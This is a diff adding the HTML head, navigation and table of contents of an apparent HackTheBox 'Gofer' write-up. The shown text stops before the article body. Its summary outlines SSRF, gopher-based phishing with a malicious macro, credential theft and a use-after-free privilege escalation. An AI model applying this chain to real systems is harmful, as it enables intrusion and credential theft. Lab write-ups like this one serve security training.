@@ -1,0 +1,1859 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="rgb(255,255,255)" />
+  
+  <title>Htb Gofer &middot; Abraxas</title>
+    <meta name="title" content="Htb Gofer &middot; Abraxas" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.017a29273e0d1e39f8792cba62098ea8e1c922fd373503ba94b73dcab44dea79.css"
+    integrity="sha256-AXopJz4NHjn4eSy6YgmOqOHJIv03NQO6lLc9yrRN6nk="
+  />
+  
+    
+    
+    
+  
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bb487ad6073790cb02c354ee8c5f8822c42c5513e10bf7a86bbe8f82118cd1fc.js"
+      integrity="sha256-u0h61gc3kMsCw1TujF&#43;IIsQsVRPhC/eoa76PghGM0fw="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the &rsquo;notes&rsquo; binary, exploiting a use-after-free vulnerability associated with a dangling pointer.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/htb-gofer/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+<link rel="manifest" href="/site.webmanifest" />
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/htb-gofer/">
+  <meta property="og:site_name" content="Abraxas">
+  <meta property="og:title" content="Htb Gofer">
+  <meta property="og:description" content="Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the ’notes’ binary, exploiting a use-after-free vulnerability associated with a dangling pointer.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-10-29T00:50:07+05:30">
+    <meta property="article:modified_time" content="2023-10-29T00:50:07+05:30">
+    <meta property="article:tag" content="Htb-Hard">
+    <meta property="article:tag" content="SMB">
+    <meta property="article:tag" content="Cme">
+    <meta property="article:tag" content="Wfuzz">
+    <meta property="article:tag" content="Phishing">
+    <meta property="article:tag" content="Macros">
+    <meta property="og:image" content="//localhost:1313/blog/htb-gofer/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/blog/htb-gofer/cover.png">
+  <meta name="twitter:title" content="Htb Gofer">
+  <meta name="twitter:description" content="Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the ’notes’ binary, exploiting a use-after-free vulnerability associated with a dangling pointer.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "Htb Gofer",
+    "headline": "Htb Gofer",
+    
+    "abstract": "Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the \u0026rsquo;notes\u0026rsquo; binary, exploiting a use-after-free vulnerability associated with a dangling pointer.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/htb-gofer\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Abraxas"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-10-29T00:50:07\u002b05:30",
+    "datePublished": "2023-10-29T00:50:07\u002b05:30",
+    
+    "dateModified": "2023-10-29T00:50:07\u002b05:30",
+    
+    "keywords": ["htb-hard","SMB","cme","wfuzz","phishing","macros","LibreOffice","SSRF","gopher","Gopherus","smtp","pspy","Ghidra","dangling-pointer","use-after-free","path-hijack"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "4351"
+  }
+  </script>
+
+
+  
+  <meta name="author" content="Abraxas" />
+  
+    
+      <link href="mailto:abr4xa5@proton.me" rel="me" />
+    
+      <link href="https://abraxas.pages.dev/" rel="me" />
+    
+      <link href="https://discordapp.com/users/703653879375724657" rel="me" />
+    
+      <link href="https://github.com/AbraXa5" rel="me" />
+    
+      <link href="https://infosec.exchange/@Abraxas" rel="me" />
+    
+      <link href="https://twitter.com/Abr4Xa5_" rel="me" />
+    
+      <link href="/blog/index.xml" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 print:hidden sm:py-10 dark:text-neutral">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Abraxas</a
+  >
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
+        >
+          <ul
+            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span></span
+              >
+            </li>
+            
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/blog/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Blog</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/categories/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Categories</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/tags/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Tags</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/about-me/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About Me</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    <button
+                      id="appearance-switcher-1"
+                      type="button"
+                      aria-label="appearance switcher"
+                    >
+                      <span
+                        class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                        title="Switch to dark appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                      <span
+                        class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                        title="Switch to light appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                    </button>
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    
+                      <button
+                        id="search-button-1"
+                        title="Search (/)"
+                      >
+                        
+                          <span
+                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </button>
+                    
+                  
+                </li>
+              
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="hidden list-none flex-row text-end sm:flex">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/blog/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/about-me/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About Me</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                <button
+                  id="appearance-switcher-2"
+                  type="button"
+                  aria-label="appearance switcher"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                    title="Switch to dark appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                  <span
+                    class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                    title="Switch to light appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                </button>
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                
+                  <button
+                    id="search-button-2"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 print:hidden dark:text-neutral-400">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Abraxas</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/htb-gofer/"
+      >Htb Gofer</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Htb Gofer
+      </h1>
+      
+        <div class="mb-12 mt-8 text-base text-neutral-500 print:hidden dark:text-neutral-400">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-10-29 00:50:07 &#43;0530 IST">29 October 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">21 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/AbraXa5/personal-blog/tree/main/content/blog/htb-gofer/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+      
+        
+          
+            <a
+              href="/categories/htb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HTB</a
+            >
+          
+            <a
+              href="/categories/linux/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Linux</a
+            >
+          
+        
+      
+        
+          
+            <a
+              href="/tags/htb-hard/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Htb-Hard</a
+            >
+          
+            <a
+              href="/tags/smb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >SMB</a
+            >
+          
+            <a
+              href="/tags/cme/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Cme</a
+            >
+          
+            <a
+              href="/tags/wfuzz/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Wfuzz</a
+            >
+          
+            <a
+              href="/tags/phishing/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Phishing</a
+            >
+          
+            <a
+              href="/tags/macros/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Macros</a
+            >
+          
+            <a
+              href="/tags/libreoffice/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >LibreOffice</a
+            >
+          
+            <a
+              href="/tags/ssrf/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >SSRF</a
+            >
+          
+            <a
+              href="/tags/gopher/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Gopher</a
+            >
+          
+            <a
+              href="/tags/gopherus/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Gopherus</a
+            >
+          
+            <a
+              href="/tags/smtp/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Smtp</a
+            >
+          
+            <a
+              href="/tags/pspy/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Pspy</a
+            >
+          
+            <a
+              href="/tags/ghidra/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Ghidra</a
+            >
+          
+            <a
+              href="/tags/dangling-pointer/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Dangling-Pointer</a
+            >
+          
+            <a
+              href="/tags/use-after-free/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Use-After-Free</a
+            >
+          
+            <a
+              href="/tags/path-hijack/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Path-Hijack</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 -mt-4 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="/blog/htb-gofer/cover_hu9ae763d3bf15dd8ecdf7dc37d0fed9da_62823_300x300_resize_q75_h2_box_3.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="300"
+        height="300"
+        class="mb-6 -mt-4 rounded-md"
+        
+        
+        
+          src="/blog/htb-gofer/cover.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 print:hidden lg:sticky lg:top-10">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#port-445---smb-enum">port 445 - SMB Enum</a></li>
+        <li><a href="#http---goferhtb">HTTP - gofer.htb</a>
+          <ul>
+            <li><a href="#fuzzing">Fuzzing</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#initial-foothold">Initial Foothold</a>
+      <ul>
+        <li><a href="#http---proxygoferhtb">HTTP - proxy.gofer.htb</a></li>
+        <li><a href="#exploiting--ssrf">Exploiting  SSRF</a>
+          <ul>
+            <li><a href="#ssrf-file-read">SSRF File Read</a></li>
+            <li><a href="#ssrf-gofer">SSRF Gofer</a></li>
+          </ul>
+        </li>
+        <li><a href="#crafting-a-malicious-macro-for-odt">Crafting a malicious macro for ODT</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-to-jhudson">Privilege Escalation to jhudson</a></li>
+    <li><a href="#privilege-escalation-to-root">Privilege Escalation to root</a>
+      <ul>
+        <li><a href="#analyzing-the-notes-binary">Analyzing the notes binary</a></li>
+        <li><a href="#exploiting-dangling-pointer">Exploiting Dangling pointer</a></li>
+      </ul>
+    </li>
+    <li><a href="#beyond-root">Beyond Root</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
